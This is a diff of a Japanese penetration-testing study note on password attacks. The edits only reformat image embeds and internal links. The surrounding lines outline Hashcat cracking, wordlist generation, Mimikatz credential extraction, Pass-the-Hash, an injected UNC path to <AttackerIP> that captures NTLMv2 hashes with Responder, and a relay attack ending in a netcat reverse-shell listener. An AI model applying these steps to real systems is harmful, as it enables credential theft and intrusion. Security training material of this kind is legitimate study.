@@ -61,7 +61,7 @@ chmod 600 id_rsa
 		※辞書攻撃であれば実施不要
 
 💡以下の手順をスキップして、Hashcatでクラッキングを走らせ、statusを表示する方法もある
-![[Pasted image 20250720131350.png]]
+![](../../画像ファイル/Pasted%20image%2020250720131350.png)
 $$所用推定時間$$
 ### 3-1. Key Space（※）を求める
 
@@ -222,7 +222,7 @@ cewl -e --email_file emails.txt -m 5 -w cewl.txt http://<TargetIP>
 echo "Suzuki Taro" > users.lst
 python3 username_generator.py -w users.lst
 ```
-![[Pasted image 20230611195317.png | 500]]
+![ 500](../../画像ファイル/Pasted%20image%2020230611195317.png)
 $$username生成例$$
 
 #### Keyspaceテクニック
@@ -274,7 +274,7 @@ python3 cupp.py -a
 ## 5. Hashの攻撃
 
 - パスワードが複雑でクラックできない場合は、PtHやrelay攻撃に展開する
-	- [Password Attack](Password%20Attack.md#Password%20Hashを用いた攻撃)
+	- [Password Attack](#Password%20Hashを用いた攻撃)
 
 ---
 ---
@@ -308,13 +308,13 @@ Local Group Memberships *Administrators
 
 [🥝Mimikatz](../../Tools/🥝Mimikatz.md#認証情報の抽出)
 
-- NTLMハッシュを取得出来たら、[Password Attack](Password%20Attack.md#2.%20Hashのフォーマット化)以降のメソドロジーでクラックする
+- NTLMハッシュを取得出来たら、[Password Attack](#2.%20Hashのフォーマット化)以降のメソドロジーでクラックする
 
 ---
 
 ## PtH
 
-- [Password Attack](Password%20Attack.md#NTLM%20Hashのクラッキング)がハッシュが複雑で成功しない場合、かつ、同じユーザー名、かつパスワードを使用するアカウントが存在するだろう場合に実施：
+- [Password Attack](#NTLM%20Hashのクラッキング)がハッシュが複雑で成功しない場合、かつ、同じユーザー名、かつパスワードを使用するアカウントが存在するだろう場合に実施：
 	[💥Lateral Movement & Persistance in AD](../🪟Windows/Active%20Directory/💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#PtH%20(Pass-the-Hash))
 
 ---
@@ -378,13 +378,13 @@ http://example/page=//<AttackerIP>/hoge
 ```
 \\\\<AttackerIP>\hoge\hoge.txt
 ```
-![[Pasted image 20250720111345.png]]
+![](../../画像ファイル/Pasted%20image%2020250720111345.png)
 $$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
 
 3. 攻撃者のResponderを確認し、ハッシュを取得したことを確認
 	- ⚠️複数のNTLMv2 Hashをキャプチャすると思うが、クラック対象はどれでもいい（一番最初のでいい）
 
-4. [Password Attack](Password%20Attack.md#Password%20Crackingメソドロジー)の２以降へ
+4. [Password Attack](#Password%20Crackingメソドロジー)の２以降へ
 
 #### Responder のトラブルシューティング
 
@@ -397,7 +397,7 @@ $$filenameパラメタの値を攻撃者のIPを指すUNCパスに変更$$
 
 ### シチュエーション
 
-- [Password Attack](Password%20Attack.md#Net-NTLMv2のクラッキング)と同じシチュエーション、かつ、ハッシュが複雑でクラックできなかった場合
+- [Password Attack](#Net-NTLMv2のクラッキング)と同じシチュエーション、かつ、ハッシュが複雑でクラックできなかった場合
 - 成功条件は、[💥Lateral Movement & Persistance in AD](../🪟Windows/Active%20Directory/💥Lateral%20Movement%20&%20Persistance%20in%20AD.md#PtH成功条件)を満たす、かつSMB singningが無効であること
 
 ### Net-NTLMv2リレーアタック手順
@@ -416,7 +416,7 @@ sudo rlwrap nc -lvnp <port>
 ```
 
 4. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
-	- 方法は[Password Attack](Password%20Attack.md#Net-NTLMv2クラッキング手順%20w/SMB)のステップ2参照
+	- 方法は[Password Attack](#Net-NTLMv2クラッキング手順%20w/SMB)のステップ2参照
 
 5. リバースシェル獲得！
 
